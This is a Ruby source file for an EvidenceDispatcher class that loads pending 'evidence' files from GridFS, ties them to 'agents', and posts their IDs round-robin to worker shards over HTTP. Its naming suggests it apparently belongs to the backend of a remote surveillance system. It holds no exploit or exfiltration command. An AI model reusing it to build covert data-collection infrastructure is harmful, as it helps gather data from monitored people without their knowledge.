require 'rcs-common/trace'
require 'eventmachine'
require 'zlib'

require_relative 'shard'

module RCS
module DB

class EvidenceDispatcher
  include Singleton
  include RCS::Tracer
  include EventMachine::Protocols
  
  def initialize
    @shards = Array.new
    
    # for each known shard, prepare a list of notification
    Shard.all['shards'].each_with_index do |shard, index|
      ip, port = shard['host'].split(':')
      @shards[index] = {host: ip, queue: []}
    end
    
    GridFS.get_distinct_filenames("evidence").each do |filename|
      ident, instance = filename.split(":")
      trace :debug, "Checking for unprocessed pending evidences for #{ident}:#{instance}"
      evidences = []
      GridFS.get_by_filename(filename, "evidence").each do |file|
        trace :debug, "found #{file["_id"]}"
        evidences << file["_id"]
      end
      notify(evidences, ident, instance)
    end
    
    # worker polling thread, check for health status
  end
  
  def notify(evidence_id, ident, instance)
    
    hash_string = "#{ident}:#{instance}"
    trace :debug, "Notifying evidences #{evidence_id} for #{hash_string}"
    
    agent = ::Item.agents.where({ident: ident, instance: instance}).first
    return false if agent.nil?
    
    # spread evidences to shards, each shard getting ALL the evidences for the same agent (round-robin)
    #identify the correct shard for the evidence
    
    shard_idx = Zlib::crc32(hash_string) % @shards.length
    trace :debug, "Sending evidence for #{hash_string} to shard #{@shards[shard_idx][:host]}"
    
    case evidence_id
      when BSON::ObjectId
        @shards[shard_idx][:queue].push({instance: instance, ident: ident, id: evidence_id})
      when Array
        evidence_list = []
        evidence_id.each do |ev|
          evidence_list << {instance: instance, ident: ident, id: ev}
        end
        @shards[shard_idx][:queue].push(*evidence_list)
    end
    
    # send the queue to the correct shard
    http = EM::HttpRequest.new("http://#{@shards[shard_idx][:host]}:5150/").post :body => {ids: @shards[shard_idx][:queue]}.to_json
    http.callback do
      @shards[shard_idx][:queue].clear
      trace :info, "Notified evidence #{evidence_id} for agent #{agent[:name]} to worker #{@shards[shard_idx][:host]}."
    end
    http.errback do
      trace :error, "Cannot notify evidence #{evidence_id} for to shard #{@shards[shard_idx][:host]}. Will retry."
    end
    
    return true
  end
  
end # EvidenceDispatcher

end # ::DB
end # ::RCS
